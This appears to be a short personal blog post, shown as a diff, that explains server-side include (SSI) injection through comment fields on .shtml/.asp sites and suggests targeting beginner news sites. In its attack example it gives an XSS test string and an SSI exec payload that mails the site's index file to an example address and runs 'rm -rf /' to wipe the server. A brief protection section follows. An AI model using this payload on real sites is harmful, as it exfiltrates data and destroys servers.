@@ -1,0 +1,45 @@
+---
+title: "Stealth Commanding"
+publishedAt: "2024-08-13"
+summary: "My first post on my new blog."
+---
+
+# [ Stealth Commanding ]
+
+### [ Content ]
+
+[1] What is Stealth Commanding \
+[2] What is SSI \
+[3] How to find vulnerability \
+[4] Example of attack \
+[5] How to protect
+
+
+[1] What is Stealth Commanding \
+Stealh Commanding is a type of web attack that comes with SSI (Server-side inclusion) codes exploiting its vulnerabilities.
+This attack can be performed if files with the extension .asp or .shtml are in question
+
+[2] What is SSI (Server-side inclusion) \
+SSI is a way of attaching some files to some file.
+In PHP, attaching files is done this way: include('header.php');
+while in ASP or SHTML it works like this: <!--#include virtual="fajl.html"-->
+
+[3] How to find vulnerability \
+Since dorks for this vulnerability do not exist, it is most often targeted at beginner sites where you can comment on some news or similar.
+If the filters are misplaced or don't exist what this bug will do is, like XSS, edit the site code and execute the "command".
+
+[4] Example of attack  \
+We came across a simple daily newspaper site and saw that if we leave a comment with the message<script>alert("XSS")</script> after refreshing
+it will throw us a message with the text XSS, which would mean that the site is vulnerable. The next thing we need to do is to instead of <script>alert("XSS")</script>
+<!--#include virtual="index.shtml"--> which will, for example, to the page /stranica/novost/ovaj-onaj-levo-desno.shtml add next to the basic things i
+index file.
+
+If we inject code like this
+```jsx
+<!--#exec cmd="mail -s 'Index' example@email.com <index.shtml; rm -rf /"-->
+```
+Which will trigger a command to be sent to my email with the title Site Index
+with the code of the index page and then format the server.
+
+[5] How to protect \
+To protect our site from this attack, it is enough to create a good filters and input validation as well as keeping systems up-to-date
